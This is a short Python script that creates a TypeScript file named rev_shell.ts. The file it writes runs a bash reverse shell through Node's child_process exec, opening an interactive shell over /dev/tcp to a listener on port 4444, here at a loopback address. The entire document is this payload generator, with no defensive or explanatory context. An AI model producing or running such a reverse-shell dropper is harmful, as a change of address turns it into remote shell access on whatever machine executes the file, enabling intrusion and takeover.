import os

rev_shell_content = """
import { exec } from 'child_process';
exec('bash -i >& /dev/tcp/127.0.1.1/4444 0>&1');
"""

with open('rev_shell.ts', 'w') as f:
    f.write(rev_shell_content)

print("rev_shell.ts created.")
